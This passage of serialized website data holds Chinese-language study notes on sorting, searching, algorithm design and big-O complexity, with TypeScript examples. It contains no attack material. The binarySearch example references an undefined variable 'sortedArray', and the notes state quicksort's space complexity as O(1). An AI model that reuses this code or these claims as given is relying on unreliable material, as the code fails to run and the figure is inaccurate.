选择排序与冒泡排序的相同点：都是比较当前项和目标项的大小，并且每轮都让最大或最小项移到数组的一边。其实就是从剩余项中找出最大或最小项，然后排到数组的一端。\n    选择排序与冒泡排序的不同点：冒泡排序是一直交换当前项和目标项以达到目的；选择排序是记住最大或最小项的位置，到一轮快结束时才交换以达到目的。\n    两者核心思想相似，但处理手段不同，这也决定它们的最差、平均时间复杂度都是o(n^2)，空间复杂度都是o(1)。而选择排序的最好时间复杂度还是o(n^2)不能提前退出，因为它减少了交换次数。\n\n\n\n# 插入排序\n\n    插入排序代码细节：insertion-sort.ts\n\n    与冒泡和选择两种排序不同的是，插入排序(insertion-sort) 不会从剩余项中找最大或最小项放入数组一端，它是每轮从剩余项中随意取一项（默认取第一个），将它与排好序的项进行比较，然后放入适当的位置；一直到剩余项都处理完。\n\n    可以说插入排序是反其道而行，随意从剩余项中取一项然后按顺序插入已排序列表里，例如插扑克牌。最差、平均时间复杂度是o(n^2)，最好情况是o(n)；空间复杂度是o(1)。\n\n\n\n# 希尔排序\n\n    希尔排序代码细节：shell-sort.ts\n\n    希尔排序(shell-sort)：先取一个增量k（可以是数组长度的一半，也可以是更好的增量取法），对数组里所有互相隔k距离的元素进行插入排序；下一轮将增量折半（或者更好增量取法），重复之前的步骤，直到增量为1（最后一个增量必须为1）并执行完插入排序后结束整个算法。\n\n    折半式增量是最先提出来的，其最好情况下的时间复杂度为o(n)，平均时间复杂度为o(n^(1.3))，最坏时间复杂度是o(n^2)。\n\n    hibbard在1963年提出的[1, 3, 7, ..., 2^n-1]这样的增量序列，特点是没有公因子。其最坏时间复杂度是o(n^(3/2))，其平均时间复杂度被模拟出来是o(n^(5/4))。\n\n    sedgewick在1982年提出[1, 8, 23, 77, 281, 1073, 4193, 16577...]，除了第一项的通项公式：4 * 2^(2 * i) + 3 * 2^i + 1（其中i为0,1,2,3,4...）；又在1986年提出[1, 5, 19, 41, 109, ...]（偶数项的通项公式：9 * 2^i - 9 * 2^(i/2) + 1，奇数项的通项公式：8 * 2^i - 6 * 2^((i+1)/2) + 1）。sedgewick提出的几种，最坏情形时间复杂度是o(n^(4/3))，平均时间复杂度猜测在o(n^(7/6))，要比hibbard好很多\n\n    希尔排序是基于插入排序的，它没有快速排序快（如果有合适的增量序列，在小规模数组中将会比堆排序、快速排序快），但在中等规模表现良好，涉及到大规模数据将不如快速排序。有一个在大规模数据中表现优异的增量序列是（斐波那契数列除去0和1将剩余的数以黄金分割比的两倍的幂进行运算得到的数列）：(1, 9, 34, 182, 836, 4025, 19001, 90358, 428481, 2034035, 9651787, 45806244, 217378076, 1031612713,…)\n\n\n\n# 归并排序\n\n    归并排序代码细节：merge-sort.ts\n\n    归并排序(merge-sort) 跟冒泡、选择、插入三种排序方式区别很大，它运用了分而治之的思想。一直将数组分割成长度近似的两段，直到长度为1不可分割；再将其一一合并，归并的过程中会将左右两边的元素进行依次排序（从左右分别拿一项进行比较，排好序放入新数组，直到左右其中一个里元素被取完，而剩余的也会被连接到新数组），最后合并得到的新数组就是排好序的数组。\n\n    最差、平均、最好时间复杂度都是o(nlogn)；空间复杂度是o(n)，因为在每次合并的过程中都使用了一个临时数组存储。\n\n\n\n# 快速排序\n\n    快速排序代码细节：quick-sort.ts\n\n    快速排序(quick-sort)：将数组分隔成两段，分隔时会对数组进行简单排序，将较小项移到分隔点左边，对应右边是较大项。但由于左右两边里面也没顺序，那将左右两边也进行分隔处理，直到不能再分隔，这样使得每个小段都有了顺序，进而整段也是有了顺序。\n    这样看来快速排序也是分而治之的一种应用，跟归并排序很像，两者区别就是：一个是分开时简单分类（大致顺序）后面直接合并， 另一个是分开时不处理后面合并时再排序。\n\n    快速排序的空间复杂度都是o(1)，没有每轮借助临时数组；快速排序的最好、平均时间复杂度都是o(nlogn)；最差时间复杂度是o(n^2)，因为当数组原本是降序的，要求排成升序的，并且基准点取的是最左边时，算出的下一轮的基准点还是最左边（一般返回给下一轮的应该是中间点），这就导致它没有了左右两边数组的递归了，而是就是它本身去排序了，退化成n^2这样的排序了。\n\n\n\n# 计数排序\n\n    计数排序代码细节：counting-sort.ts\n\n    计数排序(counting-sort)：目标数组有n个元素，其中最大值为k；先构造一个长度为k+1的统计数组，这个统计数组的索引对应着目标数组里的元素值；然后去统计目标数组里每个元素出现的次数，存储到统计数组对应索引上（次数分布到统计数组里）；最后遍历统计数组，将其索引当作新项加到新数组里，而“次数”是有几次就给新数组加同样的项几次。\n\n    值得注意的是，此方法很局限，它适合对小范围的非负整数的数组进行排序；当n不大而k很大时，是不适合使用计数排序的，因为会导致统计数组的长度过长。\n\n    计数排序的空间复杂度是o(n+k)，因为它额外使用了一个k+1长的统计数组。平均的时间复杂度是o(n+k)，最后由统计数组到新数组时，先遍历了k次，再此基础上还总共遍历了n次插入重复值；当k=n时也就是最好时间复杂度是o(n)；当k远大于n，而n很小，主要依赖于k，所以最差时间复杂度是o(k)。\n\n\n\n# 桶排序\n\n    桶排序代码细节：bucket-sort.ts\n\n    桶排序(bucket-sort)：跟计数排序类似，只是我们准备的不是统计数组，而是桶这样的二维数组；遍历目标数组，将每个元素按照大小分配到对应的桶里（将元素分布到桶里）；所有元素遍历完后，桶之间是有顺序的但桶内部是没有顺序的，这里我们就需要对桶内部进行排序，一般选择快速排序或插入排序；每个桶都排完序后，将桶合并就会得到排好序的数组。\n\n    尽量将n个数据平均分配到k个桶中，这样每个桶就有n/k个数据量；尽量的增大桶的数量，极限情况下每个桶只能得到一个数据，这样就完全避开了桶内数据的排序操作。当然，做到这一点很不容易，数据量巨大的情况下，会使得桶的数量巨大，空间浪费严重。这就是一个时间代价和空间代价的权衡问题了。\n\n    对于n个待排数据，k个桶，平均每个桶n/k个数据这样情景的平均时间复杂度为：o(n)+o(k*(n/k)*log(n/k))=o(n+nlog(n/k))。当k=n时，是最好效率的排序，也就是最好时间复杂度是o(n)。空间复杂度是o(n+k)\n\n\n\n# 基数排序\n\n    基数排序代码细节：radix-sort.ts\n\n    基数排序(radix-sort)：一种特殊的桶排序，主要是对整数或字符串的每一位进行排序，可以从低位开始也可以从高位开始；桶的数量（基数）就是一个数的进制数。例如数组是十进制整数的，那么桶数（基数）就是10，分别是从0到9这样的10个桶；然后依次从个位、十位、百位、千位这样从低到高进行每一轮排序，结束后每位上都是相对有序的，整体上也是有序的。\n\n    如果数组里的元素是位数比较多的整数，那么就适合从高位开始排，位数比较低的就适合从低位开始排；时间空间复杂度都是o(n*k)，k是元素的位数。\n\n\n\n# 堆排序\n\n    在前面章节已经说过了：堆排序\n\n\n# 搜索算法\n\n\n# 顺序搜索（线性搜索）\n\n    顺序搜索（线性搜索）代码细节：sequential-search.ts\n\n    顺序搜索（线性搜索）：遍历该线性数据结构，将每个元素和要找的元素一一进行对比，如果相同就立即返回结果，不同就继续查找。\n\n\n# 二分搜索\n\n    二分搜索代码细节：binary-search.ts\n\n    二分搜索：\n        1.在待选区间里选择中间值，如果中间值就是待搜索值，就直接返回；\n        2.如果待搜索值比中间值要小，就将目前区间的左区间（较小区间）作为待选区间，然后重复步骤1；\n        3.如果待搜索值比中间值要大，就将目前区间的右区间（较大区间）作为待选区间，然后重复步骤1。\n\n\n# 内插搜索\n\n    内插搜索代码细节：interpolation-search.ts\n\n    内插搜索：改良版的二分搜索，要在步骤1中使用一个特殊公式去选定一个值。\n        1.在待选区间里利用公式选定一个值，如果选定值就是待搜索值，就直接返回；\n        2.如果待搜索值比选定值要小，就将目前区间的左区间（较小区间）作为待选区间，然后重复之前步骤；\n        3.如果待搜索值比选定值要大，就将目前区间的右区间（较大区间）作为待选区间，然后重复之前步骤。\n\n    公式是这样的，先算出搜索值在“max和min的差值”的“占比”，再将“max的索引和min的索引的差值”乘以这个“占比”，就可以大致推断出搜索值的索引。\n\n\n# 随机算法\n\n\n# fisher-yates随机\n\n    fisher-yates随机代码细节：fisher–yates.ts\n\n    fisher-yates随机：从最后一项开始并将当前位置和一个随机位置进行交换，这个随机位置要比当前位置小。",charsets:{cjk:!0}},{title:"12.算法设计与技巧",frontmatter:{title:"12.算法设计与技巧"},regularPath:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/12.%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E6%8A%80%E5%B7%A7.html",relativePath:"book-web/数据结构与算法/12.算法设计与技巧.md",key:"v-2020ddf2",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/12.%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E6%8A%80%E5%B7%A7.html",headers:[{level:2,title:"分而治之",slug:"分而治之",normalizedTitle:"分而治之",charIndex:14},{level:2,title:"动态规划",slug:"动态规划",normalizedTitle:"动态规划",charIndex:197},{level:3,title:"最少硬币找零问题",slug:"最少硬币找零问题",normalizedTitle:"最少硬币找零问题",charIndex:393},{level:3,title:"背包问题",slug:"背包问题",normalizedTitle:"背包问题",charIndex:947},{level:3,title:"最长公共子序列",slug:"最长公共子序列",normalizedTitle:"最长公共子序列",charIndex:1700},{level:2,title:"贪心算法",slug:"贪心算法",normalizedTitle:"贪心算法",charIndex:923},{level:3,title:"最少硬币找零问题（贪心算法）",slug:"最少硬币找零问题-贪心算法",normalizedTitle:"最少硬币找零问题（贪心算法）",charIndex:2423},{level:3,title:"分数背包问题",slug:"分数背包问题",normalizedTitle:"分数背包问题",charIndex:2612},{level:3,title:"最长公共子序列（贪心算法）",slug:"最长公共子序列-贪心算法",normalizedTitle:"最长公共子序列（贪心算法）",charIndex:2703},{level:2,title:"回溯算法",slug:"回溯算法",normalizedTitle:"回溯算法",charIndex:2770},{level:3,title:"迷宫老鼠问题",slug:"迷宫老鼠问题",normalizedTitle:"迷宫老鼠问题",charIndex:2898},{level:3,title:"数独解题器",slug:"数独解题器",normalizedTitle:"数独解题器",charIndex:2905}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"分而治之 动态规划 最少硬币找零问题 背包问题 最长公共子序列 贪心算法 最少硬币找零问题（贪心算法） 分数背包问题 最长公共子序列（贪心算法） 回溯算法 迷宫老鼠问题 数独解题器",content:"# 算法设计与技巧\n\n\n# 分而治之\n\n    分而治之(divide and conquer)：将一个复杂问题分解成多个与原问题相似的子问题，这些子问题互无关联（相互独立）并且可以简单求解（不然再继续分解），原问题的解即子问题的解的合并。\n\n\n    例如前面学习到的：\n    树的遍历、树节点的查找\n    归并排序\n    快速排序\n    二分搜索的递归实现\n    汉诺塔\n\n\n# 动态规划\n\n    动态规划(dynamic programming)：跟分而治之一样，也是将复杂问题分解成相似的简单子问题，不同的是动态规划里的子问题是互相依赖的。这些子问题只解决一次并会记忆化储存（减少重复计算），在解决另外一个子问题时，可直接在记忆化表中查找它依赖的子问题的解，然后再来解决自身的问题。\n\n    例如前面学习到的：\n    斐波那契递归\n    弗洛伊德算法\n\n\n# 最少硬币找零问题\n\n    最少硬币找零问题实现代码细节：min-coin-change.ts\n\n    硬币找零问题：给出要找零的钱数，以及一些面额和对应限制数量，问有多少种找零方法。\n\n    最少硬币找零问题：在硬币找零问题基础上，问哪种找零方法所需硬币个数最少。\n\n    例如：美元的硬币面额：1, 5, 10, 25 （单位：分）。要找零36分，只需一个1分、一个10分、一个25分即可，也就是3个硬币就可以了。\n\n    该算法最重要的几点：\n        1.目标找零金额，需要一步步分割，使用什么分割呢？那就是面额，也就是要循环这个面额数组，让当前金额减去面额，得到的是一个依赖金额，用递归去求解这个依赖金额的结果（依然是减去面额，直到能简单求解）。\n        2.简单求解的程度，其实就是当前的依赖金额正好等于面额数组中的某一个。\n        3.合并子问题的结果，在合并过程中，我们会逐渐得到每个子问题的结果（互相依赖的）。         4.记忆化中的每项都只计算了一次，不会覆盖。不会覆盖的原因就是之前就已经遍历了面额并且用临时变量存储了最好的情况，在遍历结束会将最好的结果存在记忆化中。\n\n    最少硬币找零问题也有贪心算法的解法，请看“贪心算法”那节。\n\n\n# 背包问题\n\n    背包问题实现代码细节：knapsack.ts\n\n    背包问题：有一个容量为W的背包，还有一些带有各自重量和价值的物品，这些物品可重复并且有数量限制；求出将物品装入背包的最佳方案，使得总重量不超过W且总价值最大。\n\n    算法与“最少硬币找零问题”一样，细微差别就是：\n        1.“背包问题”是不超过那个容量就可以，也就是依赖的子问题有解无解都可以参与最优判断；但是“最少硬币找零问题”是必须找零到那个金额，所以必须要求依赖的子问题是有解再去判断当前视角是否是最优的。\n        2.“背包问题”多了一个数量限制在“判断当前视角是否是最优的”时要加上这个数量限制的判断。\n\n    0-1背包问题：有一个容量为W的背包，还有一些带有各自重量和价值的物品，这些物品不可重复放入；求出将物品装入背包的最佳方案，使得总重量不超过W且总价值最大。\n\n    0-1背包的算法可以使用迭代也可以用递归，其递归写法跟普通背包问题是一样只是细微上的差别。\n    而迭代的写法是用的比较多的，采用一个二维数组作为记忆化，维度是“物品”和“容量”，而这个容量是从0每次加1达到最大容量的，这点与迭代写法有差别；然后就是它有一个动态方程：\n    1) j<w(i)，V(i,j)=V(i-1,j)\n    2) j>=w(i)，V(i,j)=max｛ V(i-1,j)，V(i-1,j-w(i))+v(i) ｝\n    （j是当前容量，w(i)是物品i的重量，V是价值）当该物品重量小于当前容量时，其价值与前i-1个的价值是一样的；当该物品重量大于等于当前容量时，它能放入，其剩余容量也可能放入其他物品，价值得从“前i-1个”和“当前物品价值加上剩余容量价值”中取最大的。\n\n\n# 最长公共子序列\n\n    最长公共子序列实现代码细节：longest-common-subsequence.ts\n\n    最长公共子序列：在两个字符串序列中以相同顺序出现，但不要求连续（非字符串子串）的字符串序列。\n    例如：'acbaed'和'abcadf'的最长公共子序列是'acad'（'acbaed'为主视角，否则就是'abad'）\n\n    其算法跟0-1背包问题类似，采用迭代写法，使用一个二维数组作为记忆化，维度分别是两个字符串的具体字符。也有一个动态方程：\n    1) s(i)=s(j)，L(i,j)=L(i-1,j-1)+1\n    2) s(i)!=s(j)，L(i,j)=max｛ L(i-1,j)，L(i,j-1) ｝\n    （s(i)是第一个字符串某位置上的字符、s(j)是第二个字符串某位置上的字符，L就是最长公共子序列的当前长度）其两个位置的字符相同时，最长公共子序列的长度要在前一个相同字符的解上加一；当不同时，要在“左侧”和“上方”中选择一个最优解。\n\n\n# 贪心算法\n\n    贪心算法：期盼通过每个阶段的局部最优选择（当前最好的解），从而达到全局的最优。\n\n    要跟动态规划里的“最优解”区分开来，动态规划中的最优解是子问题的最优解或者是依赖问题的最优解，而贪心算法中的最优解是整个问题当前阶段的最优解，比较好的区分方法就动态规划有问题的“分解”解的“合并”的过程，而贪心算法是“分阶段”并且阶段之间没有依赖。\n\n    例如前面学习到的：\n        迪杰斯特拉(Dijkstra)算法\n        克鲁斯卡尔(Kruskal)算法\n        普里姆(Prim)算法\n\n\n# 最少硬币找零问题（贪心算法）\n\n    最少硬币找零问题实现代码细节：min-coin-change.ts\n\n    最少硬币找零问题：给出要找零的钱数，以及一些面额和对应限制数量，问哪种找零方法所需硬币个数最少。\n\n    例如：美元的硬币面额：1, 5, 10, 25 （单位：分）     要找零36分，先找最大的面额25，再找剩余面额最大的10，最后只能找1。\n\n\n# 分数背包问题\n\n    分数背包问题实现代码细节：knapsack.ts\n\n    分数背包问题：0-1背包只能向背包里装入完整的物品，而分数背包问题是可以装入分数的物品。\n\n\n# 最长公共子序列（贪心算法）\n\n    最长公共子序列实现代码细节：longest-common-subsequence.ts\n\n\n# 回溯算法\n\n    回溯算法：从一个可能的动作开始并试着用这个动作解决问题，如果不能解决，就回溯并选择另一个动作直到将问题解决。根据这种行为，回溯算法会尝试所有可能的动作（如果更快找到了解决办法就尝试较少的次数）来解决问题。例如：骑士巡逻问题、N皇后问题、迷宫老鼠问题、数独解题器。\n\n\n# 迷宫老鼠问题\n\n    迷宫老鼠问题实现代码细节：rat-in-maze.ts\n\n    迷宫老鼠问题：有一个N * N的矩阵，矩阵的每个位置是一个方块，每个位置可以是空闲的（值为1）也可以是被阻挡的（值为0），假设(0, 0)是起点，(n-1, n-1)是终点，找出起始点到终点的具体路径。\n\n\n# 数独解题器\n\n    数独解题器实现代码细节：sudoku-solver.ts\n\n    数独解题器：目标是用数值1-9填满一个9*9的矩阵，要求每行和每列都由这九个数字构成。矩阵还包含了小方块（3*3矩阵），它们同样需要分别用这九个数字填满。谜题在开始给出一个已经填了一部分数字的矩阵。\n\n    数独规则：将某个数填入到矩阵的这个位置是否满足数独规则         1.这一行还没有放入这个数\n        2.这一列还也没有放入这个数\n        3.这个3*3矩阵里也还没有放入这个数\n    那么这个位置就可以放入该数。",normalizedContent:"# 算法设计与技巧\n\n\n# 分而治之\n\n    分而治之(divide and conquer)：将一个复杂问题分解成多个与原问题相似的子问题，这些子问题互无关联（相互独立）并且可以简单求解（不然再继续分解），原问题的解即子问题的解的合并。\n\n\n    例如前面学习到的：\n    树的遍历、树节点的查找\n    归并排序\n    快速排序\n    二分搜索的递归实现\n    汉诺塔\n\n\n# 动态规划\n\n    动态规划(dynamic programming)：跟分而治之一样，也是将复杂问题分解成相似的简单子问题，不同的是动态规划里的子问题是互相依赖的。这些子问题只解决一次并会记忆化储存（减少重复计算），在解决另外一个子问题时，可直接在记忆化表中查找它依赖的子问题的解，然后再来解决自身的问题。\n\n    例如前面学习到的：\n    斐波那契递归\n    弗洛伊德算法\n\n\n# 最少硬币找零问题\n\n    最少硬币找零问题实现代码细节：min-coin-change.ts\n\n    硬币找零问题：给出要找零的钱数，以及一些面额和对应限制数量，问有多少种找零方法。\n\n    最少硬币找零问题：在硬币找零问题基础上，问哪种找零方法所需硬币个数最少。\n\n    例如：美元的硬币面额：1, 5, 10, 25 （单位：分）。要找零36分，只需一个1分、一个10分、一个25分即可，也就是3个硬币就可以了。\n\n    该算法最重要的几点：\n        1.目标找零金额，需要一步步分割，使用什么分割呢？那就是面额，也就是要循环这个面额数组，让当前金额减去面额，得到的是一个依赖金额，用递归去求解这个依赖金额的结果（依然是减去面额，直到能简单求解）。\n        2.简单求解的程度，其实就是当前的依赖金额正好等于面额数组中的某一个。\n        3.合并子问题的结果，在合并过程中，我们会逐渐得到每个子问题的结果（互相依赖的）。         4.记忆化中的每项都只计算了一次，不会覆盖。不会覆盖的原因就是之前就已经遍历了面额并且用临时变量存储了最好的情况，在遍历结束会将最好的结果存在记忆化中。\n\n    最少硬币找零问题也有贪心算法的解法，请看“贪心算法”那节。\n\n\n# 背包问题\n\n    背包问题实现代码细节：knapsack.ts\n\n    背包问题：有一个容量为w的背包，还有一些带有各自重量和价值的物品，这些物品可重复并且有数量限制；求出将物品装入背包的最佳方案，使得总重量不超过w且总价值最大。\n\n    算法与“最少硬币找零问题”一样，细微差别就是：\n        1.“背包问题”是不超过那个容量就可以，也就是依赖的子问题有解无解都可以参与最优判断；但是“最少硬币找零问题”是必须找零到那个金额，所以必须要求依赖的子问题是有解再去判断当前视角是否是最优的。\n        2.“背包问题”多了一个数量限制在“判断当前视角是否是最优的”时要加上这个数量限制的判断。\n\n    0-1背包问题：有一个容量为w的背包，还有一些带有各自重量和价值的物品，这些物品不可重复放入；求出将物品装入背包的最佳方案，使得总重量不超过w且总价值最大。\n\n    0-1背包的算法可以使用迭代也可以用递归，其递归写法跟普通背包问题是一样只是细微上的差别。\n    而迭代的写法是用的比较多的，采用一个二维数组作为记忆化，维度是“物品”和“容量”，而这个容量是从0每次加1达到最大容量的，这点与迭代写法有差别；然后就是它有一个动态方程：\n    1) j<w(i)，v(i,j)=v(i-1,j)\n    2) j>=w(i)，v(i,j)=max｛ v(i-1,j)，v(i-1,j-w(i))+v(i) ｝\n    （j是当前容量，w(i)是物品i的重量，v是价值）当该物品重量小于当前容量时，其价值与前i-1个的价值是一样的；当该物品重量大于等于当前容量时，它能放入，其剩余容量也可能放入其他物品，价值得从“前i-1个”和“当前物品价值加上剩余容量价值”中取最大的。\n\n\n# 最长公共子序列\n\n    最长公共子序列实现代码细节：longest-common-subsequence.ts\n\n    最长公共子序列：在两个字符串序列中以相同顺序出现，但不要求连续（非字符串子串）的字符串序列。\n    例如：'acbaed'和'abcadf'的最长公共子序列是'acad'（'acbaed'为主视角，否则就是'abad'）\n\n    其算法跟0-1背包问题类似，采用迭代写法，使用一个二维数组作为记忆化，维度分别是两个字符串的具体字符。也有一个动态方程：\n    1) s(i)=s(j)，l(i,j)=l(i-1,j-1)+1\n    2) s(i)!=s(j)，l(i,j)=max｛ l(i-1,j)，l(i,j-1) ｝\n    （s(i)是第一个字符串某位置上的字符、s(j)是第二个字符串某位置上的字符，l就是最长公共子序列的当前长度）其两个位置的字符相同时，最长公共子序列的长度要在前一个相同字符的解上加一；当不同时，要在“左侧”和“上方”中选择一个最优解。\n\n\n# 贪心算法\n\n    贪心算法：期盼通过每个阶段的局部最优选择（当前最好的解），从而达到全局的最优。\n\n    要跟动态规划里的“最优解”区分开来，动态规划中的最优解是子问题的最优解或者是依赖问题的最优解，而贪心算法中的最优解是整个问题当前阶段的最优解，比较好的区分方法就动态规划有问题的“分解”解的“合并”的过程，而贪心算法是“分阶段”并且阶段之间没有依赖。\n\n    例如前面学习到的：\n        迪杰斯特拉(dijkstra)算法\n        克鲁斯卡尔(kruskal)算法\n        普里姆(prim)算法\n\n\n# 最少硬币找零问题（贪心算法）\n\n    最少硬币找零问题实现代码细节：min-coin-change.ts\n\n    最少硬币找零问题：给出要找零的钱数，以及一些面额和对应限制数量，问哪种找零方法所需硬币个数最少。\n\n    例如：美元的硬币面额：1, 5, 10, 25 （单位：分）     要找零36分，先找最大的面额25，再找剩余面额最大的10，最后只能找1。\n\n\n# 分数背包问题\n\n    分数背包问题实现代码细节：knapsack.ts\n\n    分数背包问题：0-1背包只能向背包里装入完整的物品，而分数背包问题是可以装入分数的物品。\n\n\n# 最长公共子序列（贪心算法）\n\n    最长公共子序列实现代码细节：longest-common-subsequence.ts\n\n\n# 回溯算法\n\n    回溯算法：从一个可能的动作开始并试着用这个动作解决问题，如果不能解决，就回溯并选择另一个动作直到将问题解决。根据这种行为，回溯算法会尝试所有可能的动作（如果更快找到了解决办法就尝试较少的次数）来解决问题。例如：骑士巡逻问题、n皇后问题、迷宫老鼠问题、数独解题器。\n\n\n# 迷宫老鼠问题\n\n    迷宫老鼠问题实现代码细节：rat-in-maze.ts\n\n    迷宫老鼠问题：有一个n * n的矩阵，矩阵的每个位置是一个方块，每个位置可以是空闲的（值为1）也可以是被阻挡的（值为0），假设(0, 0)是起点，(n-1, n-1)是终点，找出起始点到终点的具体路径。\n\n\n# 数独解题器\n\n    数独解题器实现代码细节：sudoku-solver.ts\n\n    数独解题器：目标是用数值1-9填满一个9*9的矩阵，要求每行和每列都由这九个数字构成。矩阵还包含了小方块（3*3矩阵），它们同样需要分别用这九个数字填满。谜题在开始给出一个已经填了一部分数字的矩阵。\n\n    数独规则：将某个数填入到矩阵的这个位置是否满足数独规则         1.这一行还没有放入这个数\n        2.这一列还也没有放入这个数\n        3.这个3*3矩阵里也还没有放入这个数\n    那么这个位置就可以放入该数。",charsets:{cjk:!0}},{title:"13.算法复杂度",frontmatter:{title:"13.算法复杂度"},regularPath:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/13.%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E5%BA%A6.html",relativePath:"book-web/数据结构与算法/13.算法复杂度.md",key:"v-72208521",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/13.%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E5%BA%A6.html",headers:[{level:2,title:"大O表示法",slug:"大o表示法",normalizedTitle:"大o表示法",charIndex:12},{level:2,title:"理解大O表示法",slug:"理解大o表示法",normalizedTitle:"理解大o表示法",charIndex:384},{level:2,title:"时间复杂度的比较",slug:"时间复杂度的比较",normalizedTitle:"时间复杂度的比较",charIndex:2453}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"大O表示法 理解大O表示法 时间复杂度的比较",content:"# 算法复杂度\n\n\n# 大O表示法\n\n    大O表示法是用于描述算法的性能和复杂程度，可以表示时间上的复杂度也可以表示空间上的复杂度。时间复杂度一般考虑的CPU时间的占用，而空间复杂度一般考虑的内存的占用。\n    大O主要分类有下列几种：\n\n符号           名称         例子\nO(1)         常数阶        0731\nO(n)         线性阶        5n+2\nO(n^2)       平方阶        2n^2+3n+4\nO(log(n))    对数阶        3log(n)+4\nO(nlog(n))   nlog(n)阶   3nlog(n)+4n+5\nO(n^3)       立方阶        2n^3+3n^2+n+5\nO(2^n)       指数阶        2^n\n\n\n# 理解大O表示法\n\n1.O(1)：不管参数如何，只运行一次。\n\n// 不管num多大，在函数里只会运行一次，其时间复杂度就是O(1)\nfunction increment(num) {\n    return ++num;\n}\n\n\n1\n2\n3\n4\n\n\n2.O(n)：跟给定参数有关，运行情况一般是线性的。\n\n/*\n    顺序搜索，最好的情况就是第一个就搜索到，最坏的情况是最后一个\n    搜索到，平均情况下就跟array的长度有关；对应的最好情况时间复杂\n    度是O(1)，平均和最差的时间复杂度是O(n)\n*/\nfunction sequentialSearch<T>(array: T[], value: T) {\n    for (let i = 0; i < array.length; i++) {\n        if (value === array[i]) {\n            return i;\n        }\n    }\n    return -1;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n3.O(n^2)：跟线性类似，但是多用于两层的嵌套循环。\n\n// 冒泡排序，元素之间有了比较，会使用两层循环，也就是说最坏和平\n// 均复杂度是O(n^2)，最好情况是已排好序，只遍历一轮也就是O(n)\nfunction bubbleSort<T>(array: T[]) {\n    const length = array.length;\n    if (length < 2) {\n        return array;\n    }\n    for (let i = 0; i < length; i ++) {\n        // 交换状态\n        let hasSwap: boolean = false;\n        // 减i是因为每轮都把最大的冒泡到末尾了，下一轮无需再处理\n        for (let j = 0; j < length - i - 1; j ++) {\n            // 如果array[j]大于array[j + 1]就交换\n            if (array[j] > array[j + 1]) {\n                swap(array, j, j + 1);\n                hasSwap = true;\n            }\n        }\n        /*\n            如果某一轮里没有冒泡交换过，代表已经提前排好顺序了。\n            这是冒泡排序最好复杂度为O(N)的原因，其他情况是O(N^2)\n        */\n        if (!hasSwap) {\n            break;\n        }\n    }\n    return array;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n4.O(log(n))：常用于while循环和递归，条件跟n有关。\n\n// 二分搜索，每次取一个中间值与目标值对比。\n// 2^x=n，对2进行x次方才能完成n项的搜索，即对数log(n)，底数是2\nfunction binarySearch<T>(array: T[], value: T): number {\n    let low: number = 0;\n    let high: number = sortedArray.length - 1;\n    // low大于high才停止搜索\n    while (low <= high) {\n        // 每次取中间数，大概2^x完成这n项的搜索\n        const mid = low + Math.floor((high - low) / 2);\n        const midValue = sortedArray[mid];\n        if (value < midValue) {\n            high = mid - 1;\n        } else if (value > midValue) {\n            low = mid + 1;\n        } else {\n            return mid;\n        }\n    }\n    return -1;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n4.O(nlog(n))：常用于一层n次循环套上while循环或递归，例如常见的归并排序和快速排序。代码较多就不展开了，具体是具体章节查看。\n\n\n# 时间复杂度的比较\n\n    在这网站https://www.bigocheatsheet.com/可以看到相关信息。\n\n\n补充一个图的时间复杂度表：\n\n\n\n\n补充一个搜索算法的最差时间复杂度表：\n\n",normalizedContent:"# 算法复杂度\n\n\n# 大o表示法\n\n    大o表示法是用于描述算法的性能和复杂程度，可以表示时间上的复杂度也可以表示空间上的复杂度。时间复杂度一般考虑的cpu时间的占用，而空间复杂度一般考虑的内存的占用。\n    大o主要分类有下列几种：\n\n符号           名称         例子\no(1)         常数阶        0731\no(n)         线性阶        5n+2\no(n^2)       平方阶        2n^2+3n+4\no(log(n))    对数阶        3log(n)+4\no(nlog(n))   nlog(n)阶   3nlog(n)+4n+5\no(n^3)       立方阶        2n^3+3n^2+n+5\no(2^n)       指数阶        2^n\n\n\n# 理解大o表示法\n\n1.o(1)：不管参数如何，只运行一次。\n\n// 不管num多大，在函数里只会运行一次，其时间复杂度就是o(1)\nfunction increment(num) {\n    return ++num;\n}\n\n\n1\n2\n3\n4\n\n\n2.o(n)：跟给定参数有关，运行情况一般是线性的。\n\n/*\n    顺序搜索，最好的情况就是第一个就搜索到，最坏的情况是最后一个\n    搜索到，平均情况下就跟array的长度有关；对应的最好情况时间复杂\n    度是o(1)，平均和最差的时间复杂度是o(n)\n*/\nfunction sequentialsearch<t>(array: t[], value: t) {\n    for (let i = 0; i < array.length; i++) {\n        if (value === array[i]) {\n            return i;\n        }\n    }\n    return -1;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n3.o(n^2)：跟线性类似，但是多用于两层的嵌套循环。\n\n// 冒泡排序，元素之间有了比较，会使用两层循环，也就是说最坏和平\n// 均复杂度是o(n^2)，最好情况是已排好序，只遍历一轮也就是o(n)\nfunction bubblesort<t>(array: t[]) {\n    const length = array.length;\n    if (length < 2) {\n        return array;\n    }\n    for (let i = 0; i < length; i ++) {\n        // 交换状态\n        let hasswap: boolean = false;\n        // 减i是因为每轮都把最大的冒泡到末尾了，下一轮无需再处理\n        for (let j = 0; j < length - i - 1; j ++) {\n            // 如果array[j]大于array[j + 1]就交换\n            if (array[j] > array[j 